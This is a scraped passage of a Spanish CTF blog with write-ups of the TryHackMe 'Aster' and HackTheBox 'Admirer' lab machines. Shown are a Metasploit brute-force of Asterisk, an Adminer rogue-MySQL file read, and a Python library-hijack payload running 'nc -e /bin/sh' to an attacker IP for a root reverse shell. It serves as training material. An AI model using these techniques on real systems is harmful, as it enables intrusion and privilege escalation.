Un archivo JAR y enumeracion de cronjobs nos permitió leer la flag root.txt.\nRoom    Titulo Aster      Descripción Hack my server dedicated for building communications applications.   Puntos 110   Dificultad Media   Maker stuxnet     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80), cisco-sccp (2000), asterisk (5038) y el puerto ssh (22) abiertos entre otros de los cuales no logramos obtener mucha informacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77  # Nmap 7.80 scan initiated Fri Sep 25 15:53:12 2020 as: nmap -p- --min-rate 1000 -o allPorts aster.thm Warning: 10.10.105.28 giving up on port because retransmission cap hit (10). Nmap scan report for aster.thm (10.10.105.28) Host is up (0.25s latency). Not shown: 65508 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 1720/tcp open h323q931 2000/tcp open cisco-sccp 5038/tcp open unknown 8022/tcp filtered oa-system 8766/tcp filtered amcs 9765/tcp filtered unknown 12914/tcp filtered unknown 12955/tcp filtered unknown 13827/tcp filtered unknown 23734/tcp filtered unknown 24689/tcp filtered unknown 31507/tcp filtered unknown 32749/tcp filtered unknown 35841/tcp filtered unknown 36268/tcp filtered unknown 37303/tcp filtered unknown 39769/tcp filtered unknown 43235/tcp filtered unknown 45589/tcp filtered unknown 46305/tcp filtered unknown 48045/tcp filtered unknown 56150/tcp filtered unknown 60407/tcp filtered unknown 63664/tcp filtered unknown 63871/tcp filtered unknown # Nmap done at Fri Sep 25 15:55:14 2020 -- 1 IP address (1 host up) scanned in 122.08 seconds # Nmap 7.80 scan initiated Fri Sep 25 15:57:39 2020 as: nmap -p22,80,1720,2000,5038,8022,8766,9765,12914,12955,13827,23734,24689,31507,32749,35841,36268,37303,39769,43235,45589,46305,48045,56150,60407,63664,63871 -sV -sC -o servicesAllPorts aster.thm Nmap scan report for aster.thm (10.10.105.28) Host is up (0.40s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd:cd:14:a2 (RSA) | 256 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 (ECDSA) |_ 256 c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Aster CTF 1720/tcp open h323q931? 2000/tcp open cisco-sccp? 5038/tcp open asterisk Asterisk Call Manager 5.0.2 8022/tcp closed oa-system 8766/tcp closed amcs 9765/tcp closed unknown 12914/tcp closed unknown 12955/tcp closed unknown 13827/tcp closed unknown 23734/tcp closed unknown 24689/tcp closed unknown 31507/tcp closed unknown 32749/tcp closed unknown 35841/tcp closed unknown 36268/tcp closed unknown 37303/tcp closed unknown 39769/tcp closed unknown 43235/tcp closed unknown 45589/tcp closed unknown 46305/tcp closed unknown 48045/tcp closed unknown 56150/tcp closed unknown 60407/tcp closed unknown 63664/tcp closed unknown 63871/tcp closed unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 25 15:58:42 2020 -- 1 IP address (1 host up) scanned in 62.78 seconds   HTTP Encontramos una pagina web en el puerto 80 en la que nos da un script en python.\n1 2 3  kali@kali:~/thm/aster$ file output.pyc output.pyc: python 2.7 byte-compiled kali@kali:~/thm/aster$   Utilizamos uncompyle6 para extraer el codigo fuente el cual contenia algunos mensajes codificados en hex.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  # uncompyle6 version 3.7.3 # Python bytecode 2.7 (62211) # Decompiled from: Python 3.8.2 (default, Apr 1 2020, 15:52:55)  # [GCC 9.3.0] # Embedded file name: ./output.py # Compiled at: 2020-08-11 02:59:35 import pyfiglet pyfiglet_var = pyfiglet.figlet_format(\u0026#39;Hello!!\u0026#39;) oO00oOo = \u0026#39;476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e\u0026#39; OOOo0 = bytes.fromhex(oO00oOo) Oooo000o = OOOo0.decode(\u0026#39;ASCII\u0026#39;) if 0: i1 * ii1IiI1i % OOooOOo / I11i / o0O / IiiIII111iI Oo = \u0026#39;476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21\u0026#39; I1Ii11I1Ii1i = bytes.fromhex(Oo) Ooo = I1Ii11I1Ii1i.decode(\u0026#39;ASCII\u0026#39;) if 0: iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II print pyfiglet_var # okay decompiling output.pyc   Vemos en uno de los mensajes el usuario admin y que esta instalado algun software de comunicacion en el servidor.\n1 2 3  476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e: Good job, user \u0026#34;admin\u0026#34; the open source framework for building communications, installed in the server. 476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21: Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos pero no encontramos más que solo los archivos estaticos de la pagina.\n1 2 3 4 5 6  kali@kali:~/thm/aster$ gobuster dir -u http://aster.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403)   ASTERISK Entre los puertos que encontramos se encuentra Asterisk Call Manager 5.0.2 el cual permite que un usuario se conecte a este puerto y ejecute comandos o lea eventos. Al investigar sobre este \u0026ldquo;servicio/server\u0026rdquo; encontramos un post donde realizan un \u0026lsquo;Pentesting\u0026rsquo; a este servicio, primero utilizamos el modulo de metasploit use auxiliary/voip/asterisk_login el cual realiza un ataque de fuerza bruta, conociendo un nombre de usuario (admin) y utilizando los wordlist que vienen por defecto ejecutamos el modulo. Logrando encontrar la \u0026ldquo;contraseña\u0026rdquo; de este usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  msf5 \u0026gt; use auxiliary/voip/asterisk_login msf5 auxiliary(voip/asterisk_login) \u0026gt; set USERNAME admin USERNAME =\u0026gt; admin msf5 auxiliary(voip/asterisk_login) \u0026gt; set rhosts aster.thm rhosts =\u0026gt; aster.thm msf5 auxiliary(voip/asterisk_login) \u0026gt; show options Module options (auxiliary/voip/asterisk_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no A specific password to authenticate with PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt no The file that contains a list of probable passwords. RHOSTS aster.thm yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5038 yes The target port (TCP) STOP_ON_SUCCESS true yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME admin no A specific username to authenticate as USERPASS_FILE no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt no The file that contains a list of probable users accounts. VERBOSE true yes Whether to print output for all attempts msf5 auxiliary(voip/asterisk_login) \u0026gt; set stop_on_success true stop_on_success =\u0026gt; true msf5 auxiliary(voip/asterisk_login) \u0026gt; msf5 auxiliary(voip/asterisk_login) \u0026gt; run [*] 10.10.160.101:5038 - Initializing module... [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;admin\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;123456\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;12345\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;123456789\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;password\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;iloveyou\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;princess\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;1234567\u0026#39; [*] 10.10.160.101:5038 - 10.10.160.101:5038 - Trying user:\u0026#39;admin\u0026#39; with password:\u0026#39;12345678\u0026#39; [+] 10.10.160.101:5038 - User: \u0026#34;admin\u0026#34; using pass: \u0026#34;[... REDACTED ...]\u0026#34; - can login on 10.10.160.101:5038! [!] 10.10.160.101:5038 - No active DB -- Credential data will not be saved! [*] aster.thm:5038 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf5 auxiliary(voip/asterisk_login) \u0026gt;   Nos conectamos a este servicio utilizando telnet pasando las credenciales para autenticarnos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  kali@kali:~/thm/aster$ telnet aster.thm 5038 Trying 10.10.160.101... Connected to aster.thm. Escape character is \u0026#39;^]\u0026#39;. Asterisk Call Manager/5.0.2 Action: Login Username: admin Secret: [... REDACTED ...] Response: Success Message: Authentication accepted Event: FullyBooted Privilege: system,all Uptime: 5368 LastReload: 5368 Status: Fully Booted   HARRY - USER Enumeramos informacion SIP el cual contiene usuarios, \u0026ldquo;contraseñas\u0026rdquo; (secrets) y extensiones. Vemos que tenemos la \u0026ldquo;contraseña\u0026rdquo; del usuario harry, utilizamos esta en el servicio SSH y logramos obtener una shell y nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9  Action: command Command: sip show users Response: Success Message: Command output follows Output: Username Secret Accountcode Def.Context ACL Forcerport Output: 100 100 test No No Output: 101 101 test No No Output: harry [... REDACTED ...] test No No   ROOT FLAG Dentro de la carpeta de harry encontramos el archivo Example_Root.jar el cual decompilamos utilizando JavaDecompilers y encontramos que el codigo valida que el archivo /tmp/flag.dat existe, en tal caso escribe dentro de del archivo /home/harry/root.txt la cadena my secret \u0026lt;3 baby.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  import java.io.IOException; import java.io.FileWriter; import java.io.File; // // Decompiled by Procyon v0.5.36 //  public class Example_Root { public static boolean isFileExists(final File file) { return file.isFile(); } public static void main(final String[] array) { final File file = new File(\u0026#34;/tmp/flag.dat\u0026#34;); try { if (isFileExists(file)) { final FileWriter fileWriter = new FileWriter(\u0026#34;/home/harry/root.txt\u0026#34;); fileWriter.write(\u0026#34;my secret \u0026lt;3 baby\u0026#34;); fileWriter.close(); System.out.println(\u0026#34;Successfully wrote to the file.\u0026#34;); } } catch (IOException ex) { System.out.println(\u0026#34;An error occurred.\u0026#34;); ex.printStackTrace(); } } }   Realizamos una enumeracion en la maquina y encontramos dos cron que se ejecutan como usuario root\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  harry@ubuntu:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly * *\t* * *\troot\tcd /opt/ \u0026amp;\u0026amp; bash ufw.sh 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * *\t* * *\troot\tcd /root/java/ \u0026amp;\u0026amp; bash run.sh #   El primero ejecuta ufw, el segundo al parecer ejecuta algun archivo java.\n1  ufw disable   Utilizamos pspy para ver que comandos se ejecutan tomando encuenta el segundo cron. Vemos que posiblemente el archivo run.sh ejecuta java -jar root.jar que se encuentra en la carpeta /root/java/.\nSi tomamos encuenta que el archivo Example_Root.jar solo es un ejemplo, quizas el archivo root.jar es el original y realiza la escritura en /home/harry/root.txt de algun string y posiblemente nuestra flag root.txt. Para comprobar esto vamos a crear el archivo /tmp/flag.dat y esperar a que el cron se ejecute.\n1  touch /tmp/flag.dat   Logramos obtener nuestra flag root.txt.\n","description":"Aster es una maquina de TryHackMe, realizamos un ataque de fuerza bruta al login de Asterisk seguidamente obtuvimos credenciales que nos dieron acceso a la maquina. Un archivo JAR y enumeracion de cronjobs nos permitió leer la flag root.txt.","id":37,"section":"posts","tags":["uncompyle6","asterisk","metasploit","telnet","java","jar","pspy","java decompiler"],"title":"TryHackMe - Aster","uri":"https://sckull.github.io/posts/aster/"},{"content":"  Admirer de HTB. En la pagina web encontramos credenciales que dieron acceso al servicio FTP, en este ultimo vemos el codigo fuente dentro de un \u0026ldquo;backup\u0026rdquo; el cual nos guió y dio acceso a la base de datos Admirer, misma que conectamos a nuestra maquina para explotar una vulnerabilidad que nos dio acceso a la maquina. Realizando Python Library Hijacking obtuvimos acceso como root.\nInformacion de la Maquina    Nombre Admirer      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.187   Maker polarbearerGibParadox    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[8, 5.7, 6, 4, 4.3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[9, 8, 8, 2, 2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  # Nmap 7.80 scan initiated Mon Sep 14 17:51:23 2020 as: nmap -p- --min-rate 1000 -o allports 10.10.10.187 Warning: 10.10.10.187 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.187 (10.10.10.187) Host is up (0.072s latency). Not shown: 64347 closed ports, 1185 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Mon Sep 14 17:53:40 2020 -- 1 IP address (1 host up) scanned in 136.74 seconds # Nmap 7.80 scan initiated Mon Sep 14 17:54:29 2020 as: nmap -sV -sC -p21,22,80 -o serviceports 10.10.10.187 Nmap scan report for 10.10.10.187 (10.10.10.187) Host is up (0.16s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA) | 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA) |_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/admin-dir |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Admirer Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Sep 14 17:54:44 2020 -- 1 IP address (1 host up) scanned in 15.78 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6  kali@kali:~/htb/admirer$ gobuster dir -u admirer.htb -w /usr/share/wordlists/dirb/common.txt -q -x txt,php,html -t 15 /assets (Status: 301) /images (Status: 301) /index.php (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403)   Encontramos una direccion que contiene informacion personal y un nombre \u0026ldquo;waldo\u0026rdquo;.\n1 2 3 4  User-agent: * # This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo Disallow: /admin-dir   Ejecutamos nuevamente gobuster en este nueva directorio.\n1 2 3  kali@kali:~/htb/admirer$ gobuster dir -u admirer.htb/admin-dir/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -x txt,php,html -t 15 /contact.txt (Status: 200) /credentials.txt (Status: 200)   Encontramos dos archivos en uno vemos correos y en el otro contraseñas.\ncontact.txt credentials.txt  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  ########## # admins # ########## # Penny Email: p.wise@admirer.htb ############## # developers # ############## # Rajesh Email: r.nayyar@admirer.htb # Amy Email: a.bialik@admirer.htb # Leonard Email: l.galecki@admirer.htb ############# # designers # ############# # Howard Email: h.helberg@admirer.htb # Bernadette Email: b.rauch@admirer.htb     1 2 3 4 5 6 7 8 9 10 11  [Internal mail account] w.cooper@admirer.htb fgJr6q#S\\W:$P [FTP account] ftpuser %n?4Wz}R$tTF7 [Wordpress account] admin w0rdpr3ss01!       'use strict'; var containerId = JSON.parse(\"\\\"77b1e4d4d7c4c43b\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  FTP Utilizamos las credenciales en el servicio FTP, en donde encontramos dos archivos html.tar.gz y dump.sql.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  kali@kali:~/htb/admirer$ ftp admirer.htb Connected to admirer.htb. 220 (vsFTPd 3.0.3) Name (admirer.htb:kali): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-x--- 2 0 111 4096 Dec 03 2019 . drwxr-x--- 2 0 111 4096 Dec 03 2019 .. -rw-r--r-- 1 0 0 3405 Dec 02 2019 dump.sql -rw-r--r-- 1 0 0 5270987 Dec 03 2019 html.tar.gz 226 Directory send OK. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; get dump.sql local: dump.sql remote: dump.sql 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for dump.sql (3405 bytes). 226 Transfer complete. 3405 bytes received in 0.00 secs (1.8346 MB/s) ftp\u0026gt; get html.tar.gz local: html.tar.gz remote: html.tar.gz 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes). 226 Transfer complete. 5270987 bytes received in 7.27 secs (707.7599 kB/s) ftp\u0026gt;   El archivo dump.sql no tiene nada interesante, el archivo html.tar.gz contiene el codigo fuente de la pagina que se muestra en el puerto 80.\n1 2 3 4 5 6 7 8 9 10  drwxr-xr-x 6 kali kali 4.0K Sep 14 18:20 . drwxr-xr-x 3 kali kali 4.0K Sep 14 18:25 .. drwxr-x--- 6 kali kali 4.0K Jun 6 2019 assets -rw-r--r-- 1 kali kali 3.4K Sep 14 18:18 dump.sql -rw-r--r-- 1 kali kali 5.1M Sep 14 18:18 html.tar.gz drwxr-x--- 4 kali kali 4.0K Dec 2 2019 images -rw-r----- 1 kali kali 4.6K Dec 3 2019 index.php -rw-r----- 1 kali kali 134 Dec 1 2019 robots.txt drwxr-x--- 2 kali kali 4.0K Dec 2 2019 utility-scripts drwxr-x--- 2 kali kali 4.0K Dec 2 2019 w4ld0s_s3cr3t_d1r   Entre los archivos, encontramos varias contraseñas de waldo, además de ello vemos una carpeta nueva utility-scripts en la cual se encuentra una pagina que se muestran las tareas que se encuentran en /opt/scripts/admin_tasks.sh. Tambien vemos 4 opciones que \u0026ldquo;no estan disponibles\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Administrative Tasks\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h3\u0026gt;Admin Tasks Web Interface (v0.01 beta)\u0026lt;/h3\u0026gt; \u0026lt;?php // Web Interface to the admin_tasks script  //  if(isset($_REQUEST[\u0026#39;task\u0026#39;])) { $task = $_REQUEST[\u0026#39;task\u0026#39;]; if($task == \u0026#39;1\u0026#39; || $task == \u0026#39;2\u0026#39; || $task == \u0026#39;3\u0026#39; || $task == \u0026#39;4\u0026#39; || $task == \u0026#39;5\u0026#39; || $task == \u0026#39;6\u0026#39; || $task == \u0026#39;7\u0026#39;) { /*********************************************************************************** Available options: 1) View system uptime 2) View logged in users 3) View crontab (current user only) 4) Backup passwd file (not working) 5) Backup shadow file (not working) 6) Backup web data (not working) 7) Backup database (not working) NOTE: Options 4-7 are currently NOT working because they need root privileges. I\u0026#39;m leaving them in the valid tasks in case I figure out a way to securely run code as root from a PHP page. ************************************************************************************/ echo str_replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026lt;br /\u0026gt;\u0026#34;, shell_exec(\u0026#34;/opt/scripts/admin_tasks.sh $task2\u0026gt;\u0026amp;1\u0026#34;)); } else { echo(\u0026#34;Invalid task.\u0026#34;); } } ?\u0026gt; \u0026lt;p\u0026gt; \u0026lt;h4\u0026gt;Select task:\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;select name=\u0026#34;task\u0026#34;\u0026gt; \u0026lt;option value=1\u0026gt;View system uptime\u0026lt;/option\u0026gt; \u0026lt;option value=2\u0026gt;View logged in users\u0026lt;/option\u0026gt; \u0026lt;option value=3\u0026gt;View crontab\u0026lt;/option\u0026gt; \u0026lt;option value=4 disabled\u0026gt;Backup passwd file\u0026lt;/option\u0026gt; \u0026lt;option value=5 disabled\u0026gt;Backup shadow file\u0026lt;/option\u0026gt; \u0026lt;option value=6 disabled\u0026gt;Backup web data\u0026lt;/option\u0026gt; \u0026lt;option value=7 disabled\u0026gt;Backup database\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   En este punto ya no encontramos nada interesante en la pagina ya que algunos archivos fueron reemplazados con mejores opciones como db_admin.php en el que indica que implementaron una mejor alternativa de codigo abierto:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  \u0026lt;?php $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;waldo\u0026#34;; $password = \u0026#34;Wh3r3_1s_w4ld0?\u0026#34;; // Create connection  $conn = new mysqli($servername, $username, $password); // Check connection  if ($conn-\u0026gt;connect_error) { die(\u0026#34;Connection failed: \u0026#34; . $conn-\u0026gt;connect_error); } echo \u0026#34;Connected successfully\u0026#34;; // TODO: Finish implementing this or find a better open source alternative ?\u0026gt;   Utilizamos nuevamente GOBUSTER para realizar una busqueda pero esta vez en utility-scripts.\n1 2 3 4  kali@kali:~/htb/admirer$ gobuster dir -u http://admirer.htb/utility-scripts/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -t 25 -x php,html,txt /adminer.php (Status: 200) /info.php (Status: 200) /phptest.php (Status: 200)   Encontramos a Adminer una herramienta para administrar bases de datos donde logramos ver el login.\nIntenamos utilizar las credenciales que encontramos en el \u0026ldquo;backup\u0026rdquo; de la pagina web pero ninguno funciono. Exploramos las vulnerabilidades de Adminer y encontramos que es posible conectar una base de datos externa y con esta conexion leer archivos de la maquina. Lo primero que hay que realizar es configurar una base de datos en nuestra maquina en MySQL.\n1 2 3 4 5 6 7 8 9 10 11 12 13  #Database CREATE DATABASE sckull; USE sckull; #Table create TABLE file(data varchar(1000)); #User CREATE USER \u0026#39;sckull\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;sckull\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;sckull\u0026#39;@\u0026#39;%\u0026#39;; FLUSH PRIVILEGES; #Test mysql -h 10.10.10.10 -u sckull -p sckull   Luego de ello debemos de conectarnos a nuestra base de datos utilizando Adminer con las credenciales, la IP de nuestra maquina y nombre de la base de datos que creamos.\nEjecutamos un query para ralizar la lectura del archivo admirer.php y vemos su codigo fuente.\n1 2 3  load data local infile \u0026#39;admirer.php\u0026#39; into table file fields terminated by \u0026#39;\\n\u0026#39;   Despues de realizar una enumeracion logramos obtener algunas credenciales del archivo index.php.\n1 2 3 4 5 6 7 8  [... REDACTED ...] $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;waldo\u0026#34;; $password = \u0026#34;\u0026amp;\u0026lt;h5b~yK3F#{PaPB\u0026amp;dA}{H\u0026gt;\u0026#34;; $dbname = \u0026#34;admirerdb\u0026#34;; [... REDACTED ...]   WALDO - USER Utilizamos estas credenciales en el servicio ssh y logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos para ejecutar el comando /opt/scripts/admin_tasks.sh.\nEl archivo admin_tasks.sh realiza un backup de diferentes archivos como /etc/passwd, /etc/shadow, pero algo interesante es de que realiza la ejecucion de un script en python.\n1 2 3 4 5 6 7 8 9 10 11 12 13  #!/bin/bash backup_web() { if [ \u0026#34;$EUID\u0026#34; -eq 0 ] then echo \u0026#34;Running backup script in the background, it might take a while...\u0026#34; /opt/scripts/backup.py \u0026amp; else echo \u0026#34;Insufficient privileges to perform the selected operation.\u0026#34; fi }   En este script logramos ver que importa la libreria shutil especificamente una de sus funciones make_archive().\n1 2 3 4 5 6 7 8 9 10 11 12  #!/usr/bin/python3 from shutil import make_archive src = \u0026#39;/var/www/html/\u0026#39; # old ftp directory, not used anymore #dst = \u0026#39;/srv/ftp/html\u0026#39; dst = \u0026#39;/var/backups/html\u0026#39; make_archive(dst, \u0026#39;gztar\u0026#39;, src)   Vamos a realizar Python Library Hijacking al igual que en THM - Ghizer pero con una shell diferente y utilizando la variable PYTHONPATH ya que no tenemos permisos en la carpeta donde estan estos scripts y es necesario para ejecutar el comando.\nCreamos el archivo en /dev/shm/, puede ser en cualquier otra carpeta con permisos de escritura:\n1 2 3 4  import os def make_archive(no, one, this):\tos.system(\u0026#34;nc -e /bin/sh 10.10.15.75 1338\u0026#34;)   Ejecutamos y seleccionamos la opcion 6, donde esta el script de python:\n1  sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh   Logramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"Admirer de HTB. En la pagina web encontramos credenciales que dieron acceso al servicio FTP, en este ultimo vemos el codigo fuente dentro de un \"backup\" el cual nos guió y dio 